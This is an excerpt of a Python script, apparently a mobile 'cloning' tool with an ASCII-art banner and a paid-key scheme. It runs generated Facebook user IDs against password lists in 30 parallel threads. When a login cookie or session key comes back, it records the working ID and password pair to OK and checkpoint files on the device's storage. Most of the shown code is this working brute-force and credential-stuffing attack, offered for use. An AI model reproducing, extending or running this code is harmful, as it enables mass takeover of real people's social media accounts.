...
logo=("""\033[1;37m
.d8888. db    db db    db  .d8b.  d888888b d88888b      
88'  YP 88    88 `8b  d8' d8' `8b   `88'   88'          
`8bo.   88    88  `8bd8'  88ooo88    88    88ooo        
  `Y8b. 88    88    88    88~~~88    88    88~~~        
db   8D 88b  d88    88    88   88   .88.   88           
`8888Y' ~Y8888P'    YP    YP   YP Y888888P YP                                                                                                                           
----------------------------------------------
 Author    : SK SUYAIF HASAN
 Github    : SUYAIF-404
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/𝐒𝐔𝐘𝐀𝐈𝐅_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi 𝐒𝐔𝐘𝐀𝐈𝐅 Sir, I Need To Buy Your Paid 𝐒𝐔𝐘𝐀𝐈𝐅 PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python 𝐒𝐔𝐘𝐀𝐈𝐅.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as 𝐒𝐔𝐘𝐀𝐈𝐅:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                𝐒𝐔𝐘𝐀𝐈𝐅.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [𝐒𝐔𝐘𝐀𝐈𝐅-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        𝐒𝐔𝐘𝐀𝐈𝐅=session.cookies.get_dict().keys()
                        if "c_user" in 𝐒𝐔𝐘𝐀𝐈𝐅:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [𝐒𝐔𝐘𝐀𝐈𝐅-OK] %s | %s'%(ids,pas))
                                open('/sdcard/𝐒𝐔𝐘𝐀𝐈𝐅-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in 𝐒𝐔𝐘𝐀𝐈𝐅:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [𝐒𝐔𝐘𝐀𝐈𝐅-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝐒𝐔𝐘𝐀𝐈𝐅-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [𝐒𝐔𝐘𝐀𝐈𝐅-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝐒𝐔𝐘𝐀𝐈𝐅-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/𝐒𝐔𝐘𝐀𝐈𝐅-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [𝐒𝐔𝐘𝐀𝐈𝐅-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/𝐒𝐔𝐘𝐀𝐈𝐅-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [𝐒𝐔𝐘𝐀𝐈𝐅-OK] '+uid+' | '+pas+'\033[1;97m')
